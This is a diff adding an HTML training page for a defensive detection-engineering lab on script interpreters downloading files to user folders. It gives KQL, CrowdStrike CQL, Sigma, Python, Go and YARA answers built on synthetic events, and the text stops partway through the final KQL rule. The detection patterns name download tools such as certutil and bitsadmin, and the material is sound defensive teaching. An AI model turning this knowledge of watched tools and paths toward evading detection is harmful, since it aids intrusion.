@@ -1,0 +1,357 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Week 3 Lab - Script Interpreter Downloads a File</title>
+<style>
+:root{--bg:#08111f;--panel:#101d31;--panel2:#152641;--text:#eef5ff;--muted:#aebed5;--line:#29415f;--cyan:#4fd1c5;--blue:#61a9ff;--amber:#ffcc66;--red:#ff7d8d;--green:#6ee7a8;--shadow:0 18px 46px rgba(0,0,0,.24)}
+[data-theme="light"]{--bg:#eef4fb;--panel:#fff;--panel2:#f4f8fd;--text:#10213b;--muted:#586b84;--line:#cfdaea;--cyan:#087f78;--blue:#1768c4;--amber:#9b6500;--red:#ba2940;--green:#087d48;--shadow:0 16px 40px rgba(26,52,90,.12)}
+*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background:radial-gradient(circle at 10% 0%,rgba(97,169,255,.12),transparent 28%),var(--bg);color:var(--text);font:16px/1.55 Inter,Segoe UI,Arial,sans-serif;min-height:100vh}button,a{font:inherit}.shell{max-width:1180px;margin:auto;padding:18px}.topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}.topbar-inner{max-width:1180px;margin:auto;padding:10px 18px;display:flex;align-items:center;gap:12px}.brand{font-weight:800;letter-spacing:.2px}.brand span{color:var(--cyan)}.grow{flex:1}.icon-btn,.nav-btn,.answer-btn,.small-btn{border:1px solid var(--line);background:var(--panel);color:var(--text);border-radius:12px;padding:9px 12px;cursor:pointer;transition:.16s}.icon-btn:hover,.nav-btn:hover,.answer-btn:hover,.small-btn:hover{border-color:var(--cyan);transform:translateY(-1px)}button:focus-visible,a:focus-visible{outline:3px solid var(--amber);outline-offset:2px}.progress{height:4px;background:var(--line)}.progress>div{height:100%;background:linear-gradient(90deg,var(--cyan),var(--blue));transition:width .25s}
+.hero{padding:32px;border:1px solid var(--line);border-radius:24px;background:linear-gradient(135deg,rgba(79,209,197,.10),rgba(97,169,255,.06)),var(--panel);box-shadow:var(--shadow)}.eyebrow{font-size:.78rem;text-transform:uppercase;letter-spacing:.15em;color:var(--cyan);font-weight:800}.hero h1{font-size:clamp(2rem,5vw,4.2rem);line-height:1.02;margin:.35rem 0 1rem;max-width:900px}.hero p{max-width:840px;color:var(--muted);font-size:1.08rem}.chips{display:flex;flex-wrap:wrap;gap:8px;margin:18px 0}.chip{padding:6px 10px;border:1px solid var(--line);border-radius:999px;background:var(--panel2);font-size:.86rem}.chip.good{color:var(--green)}.chip.warn{color:var(--amber)}.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:20px 0}.stat{padding:16px;border:1px solid var(--line);border-radius:16px;background:var(--panel2)}.stat strong{display:block;font-size:1.8rem;color:var(--cyan)}.stat span{color:var(--muted);font-size:.88rem}
+.page{display:none;animation:fade .22s ease}.page.active{display:block}@keyframes fade{from{opacity:.25;transform:translateY(6px)}to{opacity:1;transform:none}}.page-head{display:flex;align-items:end;justify-content:space-between;gap:20px;margin:22px 0}.page-head h2{font-size:clamp(1.8rem,4vw,3rem);margin:.2rem 0}.page-no{color:var(--muted);font-weight:700}.grid{display:grid;grid-template-columns:repeat(12,1fr);gap:16px}.card{grid-column:span 6;padding:22px;border:1px solid var(--line);border-radius:18px;background:var(--panel);box-shadow:var(--shadow)}.card.full{grid-column:1/-1}.card.third{grid-column:span 4}.card h3{margin-top:0}.card p,.card li{color:var(--muted)}.callout{border-left:4px solid var(--cyan);padding:12px 16px;background:var(--panel2);border-radius:0 12px 12px 0}.warning{border-left-color:var(--amber)}.danger{border-left-color:var(--red)}
+.week-map{display:grid;grid-template-columns:repeat(7,1fr);gap:9px;margin-top:18px}.day-tile{padding:14px 10px;border:1px solid var(--line);color:var(--text);border-radius:14px;background:var(--panel2);cursor:pointer;min-height:110px;text-align:left}.day-tile:hover{border-color:var(--cyan)}.day-tile b{display:block;color:var(--cyan);margin-bottom:6px}.day-tile span{font-size:.82rem;color:var(--muted)}.flow{display:flex;align-items:center;gap:12px;justify-content:center;flex-wrap:wrap;padding:22px}.node{min-width:180px;max-width:260px;padding:18px;border:1px solid var(--line);border-radius:16px;background:var(--panel2);text-align:center;overflow-wrap:anywhere}.node strong{display:block}.node small{color:var(--muted)}.arrow{font-size:2rem;color:var(--cyan)}
+.attack{display:grid;grid-template-columns:1fr auto 1fr;align-items:center;gap:15px}.attack-card{padding:20px;border:1px solid var(--line);border-radius:16px;background:var(--panel2)}.attack-card b{font-size:1.2rem;color:var(--amber)}.attack-link{color:var(--blue);text-decoration:none}.attack-link:hover{text-decoration:underline}.table-wrap{overflow:auto;border:1px solid var(--line);border-radius:14px}table{width:100%;border-collapse:collapse;min-width:900px;background:var(--panel2)}th,td{padding:12px 14px;border-bottom:1px solid var(--line);text-align:left;vertical-align:top}th{font-size:.78rem;text-transform:uppercase;letter-spacing:.06em;color:var(--cyan);background:var(--panel)}td{font-size:.9rem}.tag{display:inline-block;padding:3px 8px;border-radius:999px;font-size:.76rem;font-weight:800}.tp{color:var(--green);background:rgba(110,231,168,.12)}.tn{color:var(--blue);background:rgba(97,169,255,.12)}
+pre{margin:0;padding:18px;overflow:auto;background:#050a12;color:#dce9fa;border-radius:14px;font:13px/1.55 ui-monospace,SFMono-Regular,Consolas,monospace;white-space:pre;tab-size:2}.code-tools{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}.answer{display:none;margin-top:10px}.answer.open{display:block}.raw{max-height:430px}.field-map{display:grid;grid-template-columns:1fr 1fr;gap:8px}.field-map div{padding:11px;border:1px solid var(--line);border-radius:10px;background:var(--panel2)}.field-map code{color:var(--cyan)}.event-picker,.rule-picker{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}.event-picker button[aria-pressed="true"],.rule-picker button[aria-pressed="true"]{border-color:var(--cyan);color:var(--cyan)}.event-detail{padding:20px;border:1px solid var(--line);border-radius:16px;background:var(--panel2)}.detail-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}.detail-item{padding:10px;border-radius:10px;background:var(--panel);overflow-wrap:anywhere}.detail-item small{display:block;color:var(--muted)}details{border:1px solid var(--line);border-radius:14px;background:var(--panel2);padding:12px}summary{cursor:pointer;color:var(--cyan);font-weight:800}.result{margin-top:12px;padding:12px;border-radius:12px;background:var(--panel2);min-height:48px}.result.pass{border:1px solid var(--green);color:var(--green)}.result.fail{border:1px solid var(--red);color:var(--red)}.checklist{list-style:none;padding:0}.checklist li{padding:10px 0;border-bottom:1px solid var(--line)}.checklist li:before{content:'✓';color:var(--green);font-weight:900;margin-right:9px}.validator-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}.metric{padding:16px;border:1px solid var(--line);border-radius:14px;text-align:center;background:var(--panel2)}.metric strong{display:block;font-size:2rem}.nav-footer{display:flex;align-items:center;justify-content:space-between;gap:14px;margin:24px 0 8px}.dots{display:flex;gap:6px;flex-wrap:wrap;justify-content:center}.dot{width:34px;height:34px;border:1px solid var(--line);border-radius:50%;background:var(--panel);color:var(--muted);cursor:pointer}.dot.active{background:var(--cyan);color:#03111b;border-color:var(--cyan);font-weight:900}.status-bar{margin-top:16px;padding:14px;border:1px solid var(--line);border-radius:14px;background:var(--panel);color:var(--muted);font-size:.88rem}.hash{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;overflow-wrap:anywhere;font-size:.83rem}.compact{margin:.35rem 0}.hidden-rule{display:none}.hidden-rule.open{display:block}
+@media(max-width:850px){.stats{grid-template-columns:repeat(2,1fr)}.week-map{grid-template-columns:repeat(2,1fr)}.card,.card.third{grid-column:1/-1}.attack{grid-template-columns:1fr}.attack .arrow{transform:rotate(90deg);text-align:center}.detail-grid,.validator-grid{grid-template-columns:1fr}.topbar .brand{font-size:.9rem}.topbar-inner{gap:7px}.icon-btn{padding:8px}.hero{padding:22px}}@media(max-width:520px){.shell{padding:12px}.stats{grid-template-columns:1fr}.week-map{grid-template-columns:1fr}.page-head{align-items:start;flex-direction:column}.nav-footer .nav-btn{font-size:.84rem;padding:8px}.dots{display:none}}@media print{.topbar,.nav-footer,.code-tools{display:none}.page{display:block!important;break-after:page}.shell{max-width:none}.card,.hero{box-shadow:none}}
+</style>
+</head>
+<body>
+<header class="topbar"><div class="topbar-inner"><a href="index.html" class="icon-btn" style="text-decoration:none" title="Back to all labs">← All labs</a><div class="brand">Detection Lab <span>W3</span></div><div class="grow"></div><button class="icon-btn" id="textBtn" title="Increase text size">A+</button><button class="icon-btn" id="themeBtn" title="Switch theme">Light</button></div><div class="progress"><div id="progress"></div></div></header>
+<main class="shell">
+<section class="page active" data-page="1">
+ <div class="hero"><div class="eyebrow">Month 1 - Endpoint Foundations · Week 3 · Starter</div><h1>Script interpreter downloads a file</h1><p>Learn one clear behavior: PowerShell, certutil, curl, or bitsadmin retrieves a file and writes it to a user-writable Windows directory. Follow the process, network, and file evidence without treating every download as malicious.</p><div class="chips"><span class="chip">Windows endpoint</span><span class="chip">Process + network + file</span><span class="chip">T1105</span><span class="chip">T1059.001</span><span class="chip good">4 true positives</span><span class="chip">4 benign negatives</span><span class="chip warn">Synthetic data only</span></div></div>
+ <div class="stats"><div class="stat"><strong>8</strong><span>labeled download events</span></div><div class="stat"><strong>7</strong><span>daily labs</span></div><div class="stat"><strong>4</strong><span>download tools watched</span></div><div class="stat"><strong>3</strong><span>telemetry types joined</span></div></div>
+ <div class="grid"><article class="card full"><h3>Week map</h3><p>Each day adds one small piece. Day 7 uses the same fixtures and tuning, so nothing appears by surprise.</p><div class="week-map"><button class="day-tile" onclick="go(2)"><b>Day 1</b><span>Read TP/TN event fixtures</span></button><button class="day-tile" onclick="go(3)"><b>Day 2</b><span>Correlate with KQL</span></button><button class="day-tile" onclick="go(4)"><b>Day 3</b><span>Translate to CrowdStrike CQL</span></button><button class="day-tile" onclick="go(5)"><b>Day 4</b><span>Write selection + filter Sigma</span></button><button class="day-tile" onclick="go(6)"><b>Day 5</b><span>Join process and file JSONL</span></button><button class="day-tile" onclick="go(7)"><b>Day 6</b><span>Count extensions and scan a sample</span></button><button class="day-tile" onclick="go(8)"><b>Day 7</b><span>Validate the tuned capstone</span></button></div></article>
+ <article class="card"><h3>Detection idea</h3><div class="flow"><div class="node"><strong>Selected tool</strong><small>PowerShell / certutil / curl / bitsadmin</small></div><div class="arrow">→</div><div class="node"><strong>HTTP(S)</strong><small>URL and domain</small></div><div class="arrow">→</div><div class="node"><strong>User path</strong><small>Downloads / Desktop / Temp</small></div></div></article>
+ <article class="card"><h3>Success criteria</h3><ul class="checklist"><li>Events 1–4 match</li><li>Events 5–8 stay quiet</li><li>Process ID links process and file evidence</li><li>Hash is shown, not treated as a verdict</li><li>False positives remain in analyst notes</li></ul></article></div>
+</section>
+
+<section class="page" data-page="2"><div class="page-head"><div><div class="eyebrow">Week 3 · Day 1</div><h2>Read the download events</h2></div><div class="page-no">Page 2 / 8</div></div><div class="grid">
+ <article class="card full"><h3>What to look for</h3><ol><li>Confirm the process is PowerShell, certutil, curl, or bitsadmin.</li><li>Confirm an HTTP or HTTPS URL is present.</li><li>Follow the process ID to the network and file records.</li><li>Confirm the destination is under a user Downloads, Desktop, or AppData Local Temp directory.</li><li>Apply only the exact approved package-manager tuning.</li></ol></article>
+ <article class="card full"><h3>Visual event chain</h3><div class="flow"><div class="node"><small>Process event</small><strong id="flowTool">powershell.exe</strong><small id="flowCommand">starts the retrieval</small></div><div class="arrow">→</div><div class="node"><small>Network event</small><strong id="flowDomain">files.example-test.net</strong><small id="flowIP">203.0.113.10</small></div><div class="arrow">→</div><div class="node"><small>File event</small><strong id="flowFile">payload.bin</strong><small>created + SHA-256</small></div></div></article>
+ <article class="card full"><h3>Human-readable event table</h3><div class="table-wrap"><table><thead><tr><th>#</th><th>Time / device</th><th>Tool</th><th>Domain</th><th>Destination</th><th>Expected</th><th>Why</th></tr></thead><tbody id="eventsTable"></tbody></table></div></article>
+ <article class="card"><h3>Explore one event</h3><div class="event-picker" id="eventPicker"></div><div class="event-detail" id="eventDetail"></div></article>
+ <article class="card"><h3>Expandable JSONL fixtures</h3><p>Save these lines as <code>download_events.jsonl</code>. Each line is one simplified process + network + file view.</p><details><summary>Show raw TP/TN JSONL</summary><div class="code-tools"><button class="small-btn" onclick="copyFrom('rawJsonCode',this)">Copy JSONL</button></div><pre class="raw"><code id="rawJsonCode"></code></pre></details></article>
+ <article class="card full"><h3>MITRE ATT&amp;CK - visual map</h3><div class="attack"><div class="attack-card"><b>T1059.001</b><h4>Command and Scripting Interpreter: PowerShell</h4><p>PowerShell is one of the interpreters in scope. Process context and command line show how it was used.</p><a class="attack-link" href="https://attack.mitre.org/techniques/T1059/001/" target="_blank" rel="noopener noreferrer">Official MITRE page ↗</a></div><div class="arrow">→</div><div class="attack-card"><b>T1105</b><h4>Ingress Tool Transfer</h4><p>The behavior transfers a file into the environment. Network and file telemetry help confirm the transfer.</p><a class="attack-link" href="https://attack.mitre.org/techniques/T1105/" target="_blank" rel="noopener noreferrer">Official MITRE page ↗</a></div></div></article>
+</div></section>
+
+<section class="page" data-page="3"><div class="page-head"><div><div class="eyebrow">Week 3 · Day 2</div><h2>KQL behavior query + tuning</h2></div><div class="page-no">Page 3 / 8</div></div><div class="grid">
+ <article class="card"><h3>Easy plan</h3><ol><li>Select the four download tools.</li><li>Join network events by device and process ID.</li><li>Join file events the same way.</li><li>Keep user-writable destinations.</li><li>Require all evidence within five minutes.</li></ol></article><article class="card"><h3>Narrow tuning</h3><p>The example suppresses only a <b>winget.exe</b> parent using the exact corporate package domain. It does not allow every PowerShell download or every corporate user.</p><div class="callout warning">Confirm the repository owner and review the exception regularly.</div></article>
+ <article class="card full"><h3>KQL answer</h3><p>Use Microsoft Defender Advanced Hunting after checking the three table and field names in your tenant.</p><div class="code-tools"><button class="answer-btn" onclick="toggle('kqlAnswer')">Show KQL answer</button><button class="small-btn" onclick="copyFrom('kqlCode',this)">Copy KQL</button></div><div class="answer" id="kqlAnswer"><pre><code id="kqlCode">let ApprovedPackageDomains = dynamic([&quot;packages.corp.example&quot;]);
+let Downloaders =
+    DeviceProcessEvents
+    | where FileName in~ (&quot;powershell.exe&quot;, &quot;pwsh.exe&quot;, &quot;certutil.exe&quot;, &quot;curl.exe&quot;, &quot;bitsadmin.exe&quot;)
+    | where ProcessCommandLine matches regex @&quot;(?i)https?://&quot;
+    | where ProcessCommandLine has_any (@&quot;\Downloads\&quot;, @&quot;\Desktop\&quot;, @&quot;\AppData\Local\Temp\&quot;)
+    | where not(
+        InitiatingProcessFileName =~ &quot;winget.exe&quot;
+        and ProcessCommandLine has_any (ApprovedPackageDomains)
+    )
+    | project DeviceId, DeviceName, ProcessId, ProcTime=Timestamp,
+              Tool=FileName, Parent=InitiatingProcessFileName,
+              CommandLine=ProcessCommandLine;
+let Network =
+    DeviceNetworkEvents
+    | where InitiatingProcessFileName in~ (&quot;powershell.exe&quot;, &quot;pwsh.exe&quot;, &quot;certutil.exe&quot;, &quot;curl.exe&quot;, &quot;bitsadmin.exe&quot;)
+    | project DeviceId, ProcessId=InitiatingProcessId,
+              NetTime=Timestamp, Domain=RemoteUrl, RemoteIP;
+let Files =
+    DeviceFileEvents
+    | where ActionType in (&quot;FileCreated&quot;, &quot;FileRenamed&quot;)
+    | extend TargetPath=strcat(FolderPath, @&quot;\&quot;, FileName)
+    | where TargetPath matches regex @&quot;(?i)\\Users\\[^\\]+\\(Downloads|Desktop|AppData\\Local\\Temp)\\&quot;
+    | project DeviceId, ProcessId=InitiatingProcessId,
+              FileTime=Timestamp, TargetPath, SHA256;
+Downloaders
+| join kind=inner Network on DeviceId, ProcessId
+| join kind=inner Files on DeviceId, ProcessId
+| where NetTime between (ProcTime .. ProcTime + 5m)
+| where FileTime between (ProcTime .. ProcTime + 5m)
+| project ProcTime, DeviceName, Tool, Parent, Domain, RemoteIP,
+          TargetPath, SHA256, CommandLine
+| order by ProcTime desc</code></pre></div></article>
+ <article class="card full"><h3>Analyst notes</h3><p><b>Likely false positives:</b> package managers, browser helpers that hand a URL to a command-line utility, enterprise installers, and managed update agents. Validate the parent process, signer, domain owner, destination, hash reputation, user intent, and nearby process activity before closing an alert.</p></article>
+</div></section>
+
+<section class="page" data-page="4"><div class="page-head"><div><div class="eyebrow">Week 3 · Day 3</div><h2>CrowdStrike CQL translation</h2></div><div class="page-no">Page 4 / 8</div></div><div class="grid">
+ <article class="card"><h3>What changes</h3><p>This process query keeps the same tools, URL, user-path test, and approved package combination. Use the event search to pivot from the process ID into network and file-write events in your Falcon data.</p><div class="callout">Field names vary by Falcon data source; confirm them with one known event first.</div></article>
+ <article class="card"><h3>Small field map</h3><div class="field-map"><div>Meaning<br><code>tool</code></div><div>Falcon<br><code>FileName</code></div><div>Meaning<br><code>parent</code></div><div>Falcon<br><code>ParentBaseFileName</code></div><div>Meaning<br><code>command line</code></div><div>Falcon<br><code>CommandLine</code></div><div>Meaning<br><code>device</code></div><div>Falcon<br><code>ComputerName</code></div><div>Meaning<br><code>process ID</code></div><div>Falcon<br><code>TargetProcessId</code></div></div></article>
+ <article class="card full"><h3>CrowdStrike CQL answer</h3><p>Paste into Falcon LogScale or Next-Gen SIEM Search after confirming your field map.</p><div class="code-tools"><button class="answer-btn" onclick="toggle('cqlAnswer')">Show CrowdStrike CQL answer</button><button class="small-btn" onclick="copyFrom('cqlCode',this)">Copy CQL</button></div><div class="answer" id="cqlAnswer"><pre><code id="cqlCode">#event_simpleName=ProcessRollup2
+| in(field=&quot;FileName&quot;, values=[&quot;powershell.exe&quot;, &quot;pwsh.exe&quot;, &quot;certutil.exe&quot;, &quot;curl.exe&quot;, &quot;bitsadmin.exe&quot;], ignoreCase=true)
+| CommandLine=/https?:\/\//i
+| CommandLine=/\\Users\\[^\\]+\\(Downloads|Desktop|AppData\\Local\\Temp)\\/i
+| not(ParentBaseFileName=&quot;winget.exe&quot; and CommandLine=/https?:\/\/packages\.corp\.example\//i)
+| regex(&quot;(?i)(?&lt;DownloadUrl&gt;https?://[^\\s\&quot;&#x27;]+)&quot;, field=CommandLine)
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName,
+         FileName, DownloadUrl, CommandLine])</code></pre></div></article>
+ <article class="card full"><h3>Analyst notes</h3><p><b>Likely false positives:</b> package managers, browser helpers, enterprise installers, and update agents. The process query is a starting signal; pivot to network and file events to confirm the domain, destination, and hash.</p></article>
+</div></section>
+
+<section class="page" data-page="5"><div class="page-head"><div><div class="eyebrow">Week 3 · Day 4</div><h2>Sigma selection + filter</h2></div><div class="page-no">Page 5 / 8</div></div><div class="grid">
+ <article class="card"><h3>Read the condition</h3><p>The rule requires a selected tool, a URL, and a user-writable path. It then removes one exact approved package-manager pattern. There is no <code>id</code> and no <code>status</code>.</p></article><article class="card"><h3>Visual logic</h3><div class="flow"><div class="node"><strong>Tool + URL + path</strong><small>three selections</small></div><div class="arrow">−</div><div class="node"><strong>Approved pair</strong><small>winget parent + corporate domain</small></div><div class="arrow">→</div><div class="node"><strong>Review</strong><small>context still matters</small></div></div></article>
+ <article class="card full"><h3>Sigma answer</h3><div class="code-tools"><button class="answer-btn" onclick="toggle('sigmaAnswer')">Show Sigma answer</button><button class="small-btn" onclick="copyFrom('sigmaCode',this)">Copy Sigma</button></div><div class="answer" id="sigmaAnswer"><pre><code id="sigmaCode">title: Script or Transfer Tool Downloads to a User-Writable Directory
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_tools:
+    Image|endswith:
+      - &#x27;\powershell.exe&#x27;
+      - &#x27;\pwsh.exe&#x27;
+      - &#x27;\certutil.exe&#x27;
+      - &#x27;\curl.exe&#x27;
+      - &#x27;\bitsadmin.exe&#x27;
+  selection_url:
+    CommandLine|contains:
+      - &#x27;http://&#x27;
+      - &#x27;https://&#x27;
+  selection_user_path:
+    CommandLine|contains:
+      - &#x27;\Downloads\&#x27;
+      - &#x27;\Desktop\&#x27;
+      - &#x27;\AppData\Local\Temp\&#x27;
+  filter_approved_package:
+    ParentImage|endswith: &#x27;\winget.exe&#x27;
+    CommandLine|contains: &#x27;https://packages.corp.example/&#x27;
+  condition: selection_tools and selection_url and selection_user_path and not filter_approved_package
+falsepositives:
+  - Package managers using an approved corporate repository
+  - Browser helpers that hand work to a command-line tool
+  - Enterprise installers with temporary staging paths
+  - Managed update agents using PowerShell or curl
+level: medium</code></pre></div></article>
+ <article class="card full"><h3>Analyst notes</h3><p><b>Likely false positives:</b> package managers, browser helpers, enterprise installers, and update agents. Keep the exception narrow; broad allowlisting of PowerShell, a user, or an entire domain can hide a real transfer.</p></article>
+</div></section>
+
+<section class="page" data-page="6"><div class="page-head"><div><div class="eyebrow">Week 3 · Day 5</div><h2>Join process and file JSONL with Python</h2></div><div class="page-no">Page 6 / 8</div></div><div class="grid">
+ <article class="card"><h3>Simple job</h3><p>Save the two expandable datasets below. Python stores process records by <code>process_id</code>, reads each file record, finds its process, and prints only matching downloads.</p><div class="callout">Expected process IDs: <b>101, 202, 303, 404</b>.</div></article><article class="card"><h3>Join picture</h3><div class="flow"><div class="node"><strong>processes.jsonl</strong><small>process_id + tool + URL</small></div><div class="arrow">→</div><div class="node"><strong>same process_id</strong><small>the join key</small></div><div class="arrow">→</div><div class="node"><strong>files.jsonl</strong><small>path + SHA-256</small></div></div></article>
+ <article class="card"><h3>Process records</h3><details><summary>Show processes.jsonl</summary><div class="code-tools"><button class="small-btn" onclick="copyFrom('processJsonCode',this)">Copy process JSONL</button></div><pre class="raw"><code id="processJsonCode"></code></pre></details></article><article class="card"><h3>File records</h3><details><summary>Show files.jsonl</summary><div class="code-tools"><button class="small-btn" onclick="copyFrom('fileJsonCode',this)">Copy file JSONL</button></div><pre class="raw"><code id="fileJsonCode"></code></pre></details></article>
+ <article class="card full"><h3>Python answer</h3><div class="code-tools"><button class="answer-btn" onclick="toggle('pythonAnswer')">Show Python answer</button><button class="small-btn" onclick="copyFrom('pythonCode',this)">Copy Python</button></div><div class="answer" id="pythonAnswer"><pre><code id="pythonCode">import json
+from pathlib import PureWindowsPath
+
+TOOLS = {&quot;powershell.exe&quot;, &quot;pwsh.exe&quot;, &quot;certutil.exe&quot;, &quot;curl.exe&quot;, &quot;bitsadmin.exe&quot;}
+USER_DIRS = (&quot;\\downloads\\&quot;, &quot;\\desktop\\&quot;, &quot;\\appdata\\local\\temp\\&quot;)
+
+
+def name(path):
+    return PureWindowsPath(path).name.lower()
+
+
+def is_download(process, file_event):
+    tool_ok = process[&quot;tool&quot;].lower() in TOOLS
+    url_ok = process[&quot;url&quot;].lower().startswith((&quot;http://&quot;, &quot;https://&quot;))
+    path_ok = &quot;\\users\\&quot; in file_event[&quot;target_path&quot;].lower()
+    path_ok = path_ok and any(x in file_event[&quot;target_path&quot;].lower() for x in USER_DIRS)
+    approved = name(process[&quot;parent_image&quot;]) == &quot;winget.exe&quot;
+    approved = approved and process[&quot;domain&quot;].lower() == &quot;packages.corp.example&quot;
+    return tool_ok and url_ok and path_ok and not approved
+
+
+processes = {}
+with open(&quot;processes.jsonl&quot;, encoding=&quot;utf-8&quot;) as source:
+    for line in source:
+        process = json.loads(line)
+        processes[process[&quot;process_id&quot;]] = process
+
+with open(&quot;files.jsonl&quot;, encoding=&quot;utf-8&quot;) as source:
+    for line in source:
+        file_event = json.loads(line)
+        process = processes.get(file_event[&quot;process_id&quot;])
+        if process and is_download(process, file_event):
+            print(f&#x27;{process[&quot;process_id&quot;]} → {file_event[&quot;target_path&quot;]} → {file_event[&quot;sha256&quot;][:12]}&#x27;)</code></pre></div></article>
+ <article class="card full"><h3>Analyst notes</h3><p><b>Likely false positives:</b> package managers, browser helpers, enterprise installers, and update agents. The sample filter uses an exact parent + domain exception; production code should also check signing, ownership, expiry, and expected device scope.</p></article>
+</div></section>
+
+<section class="page" data-page="7"><div class="page-head"><div><div class="eyebrow">Week 3 · Day 6</div><h2>Summarize extensions with Go + scan with YARA</h2></div><div class="page-no">Page 7 / 8</div></div><div class="grid">
+ <article class="card"><h3>Go task</h3><p>Read <code>download_events.jsonl</code>, apply the same easy detector, take the extension from each matching destination, and count it.</p><div class="callout">Expected: <b>.bin: 1</b>, <b>.dat: 1</b>, <b>.exe: 1</b>, <b>.ps1: 1</b>.</div></article><article class="card"><h3>Why YARA is separate</h3><p>The process rule finds transfer behavior. YARA scans bytes after a file exists. The training rule below matches a harmless synthetic marker and domain; it is not a malware family rule.</p></article>
+ <article class="card full"><h3>Go answer</h3><div class="code-tools"><button class="answer-btn" onclick="toggle('goAnswer')">Show Go answer</button><button class="small-btn" onclick="copyFrom('goCode',this)">Copy Go</button></div><div class="answer" id="goAnswer"><pre><code id="goCode">package main
+
+import (
+    &quot;bufio&quot;
+    &quot;encoding/json&quot;
+    &quot;fmt&quot;
+    &quot;os&quot;
+    &quot;path/filepath&quot;
+    &quot;sort&quot;
+    &quot;strings&quot;
+)
+
+type Event struct {
+    ProcessID  int    `json:&quot;process_id&quot;`
+    Parent     string `json:&quot;parent_image&quot;`
+    Tool       string `json:&quot;tool&quot;`
+    URL        string `json:&quot;url&quot;`
+    Domain     string `json:&quot;domain&quot;`
+    TargetPath string `json:&quot;target_path&quot;`
+}
+
+func base(path string) string {
+    return strings.ToLower(filepath.Base(strings.ReplaceAll(path, &quot;\\&quot;, &quot;/&quot;)))
+}
+
+func isDownload(e Event) bool {
+    tools := map[string]bool{&quot;powershell.exe&quot;: true, &quot;pwsh.exe&quot;: true, &quot;certutil.exe&quot;: true, &quot;curl.exe&quot;: true, &quot;bitsadmin.exe&quot;: true}
+    path := strings.ToLower(e.TargetPath)
+    userDir := strings.Contains(path, &quot;\\users\\&quot;) &amp;&amp;
+        (strings.Contains(path, &quot;\\downloads\\&quot;) || strings.Contains(path, &quot;\\desktop\\&quot;) || strings.Contains(path, &quot;\\appdata\\local\\temp\\&quot;))
+    approved := base(e.Parent) == &quot;winget.exe&quot; &amp;&amp; strings.EqualFold(e.Domain, &quot;packages.corp.example&quot;)
+    return tools[strings.ToLower(e.Tool)] &amp;&amp; strings.HasPrefix(strings.ToLower(e.URL), &quot;http&quot;) &amp;&amp; userDir &amp;&amp; !approved
+}
+
+func main() {
+    file, err := os.Open(&quot;download_events.jsonl&quot;)
+    if err != nil { panic(err) }
+    defer file.Close()
+
+    counts := map[string]int{}
+    scan := bufio.NewScanner(file)
+    for scan.Scan() {
+        var event Event
+        if json.Unmarshal(scan.Bytes(), &amp;event) == nil &amp;&amp; isDownload(event) {
+            clean := strings.ReplaceAll(event.TargetPath, &quot;\\&quot;, &quot;/&quot;)
+            counts[strings.ToLower(filepath.Ext(clean))]++
+        }
+    }
+    if err := scan.Err(); err != nil { panic(err) }
+
+    extensions := make([]string, 0, len(counts))
+    for extension := range counts { extensions = append(extensions, extension) }
+    sort.Strings(extensions)
+    for _, extension := range extensions { fmt.Printf(&quot;%s: %d\n&quot;, extension, counts[extension]) }
+}</code></pre></div></article>
+ <article class="card"><h3>Synthetic sample</h3><p>Save as <code>week3-synthetic-sample.txt</code>. Its SHA-256 is shown below.</p><div class="hash">307037dbd22d1ad4544d491288c7f87442b23acd3133fcc48cb89f1ed26059d8</div><div class="code-tools"><button class="small-btn" onclick="copyFrom('sampleCode',this)">Copy sample</button></div><pre><code id="sampleCode">WEEK3_LAB_SYNTHETIC_DOWNLOAD
+source=files.example-test.net
+purpose=training-only</code></pre></article>
+ <article class="card"><h3>YARA answer</h3><p>Run with <code>yara week3.yar week3-synthetic-sample.txt</code>.</p><div class="code-tools"><button class="answer-btn" onclick="toggle('yaraAnswer')">Show YARA answer</button><button class="small-btn" onclick="copyFrom('yaraCode',this)">Copy YARA</button></div><div class="answer" id="yaraAnswer"><pre><code id="yaraCode">rule Week3_Synthetic_Download_Test
+{
+  meta:
+    description = &quot;Matches only the harmless Week 3 training sample&quot;
+    purpose = &quot;training&quot;
+  strings:
+    $marker = &quot;WEEK3_LAB_SYNTHETIC_DOWNLOAD&quot; ascii
+    $domain = &quot;files.example-test.net&quot; ascii
+  condition:
+    all of them
+}</code></pre></div></article>
+ <article class="card full"><h3>Analyst notes</h3><p><b>Likely false positives:</b> this exact YARA rule is intentionally limited to the synthetic training marker, but generic YARA strings can match unrelated content. For the transfer behavior, review package managers, browser helpers, enterprise installers, and update agents. Never use a file extension or hash presence alone as proof of maliciousness.</p></article>
+</div></section>
+
+<section class="page" data-page="8"><div class="page-head"><div><div class="eyebrow">Week 3 · Day 7</div><h2>Capstone: prove the complete download</h2></div><div class="page-no">Page 8 / 8</div></div><div class="grid">
+ <article class="card full"><h3>Process → destination → hash</h3><p>The four rows below are the tuned matches. Each row keeps the process that initiated the retrieval, the destination file, and the observed SHA-256 together.</p><div class="table-wrap"><table><thead><tr><th>Process</th><th>URL / domain</th><th>Destination file</th><th>SHA-256</th></tr></thead><tbody id="capstoneTable"></tbody></table></div></article>
+ <article class="card full"><h3>One tuned rule per detection language</h3><p>Select a language to review its final rule. Each answer panel contains code only.</p><div class="rule-picker"><button class="small-btn" onclick="showRule('finalKql',this)">Show KQL</button><button class="small-btn" onclick="showRule('finalCql',this)">Show CrowdStrike CQL</button><button class="small-btn" onclick="showRule('finalSigma',this)">Show Sigma</button><button class="small-btn" onclick="showRule('finalYara',this)">Show YARA</button></div><div class="hidden-rule" id="finalKql"><pre><code>let ApprovedPackageDomains = dynamic([&quot;packages.corp.example&quot;]);
+let Downloaders =
+    DeviceProcessEvents
+    | where FileName in~ (&quot;powershell.exe&quot;, &quot;pwsh.exe&quot;, &quot;certutil.exe&quot;, &quot;curl.exe&quot;, &quot;bitsadmin.exe&quot;)
+    | where ProcessCommandLine matches regex @&quot;(?i)https?://&quot;
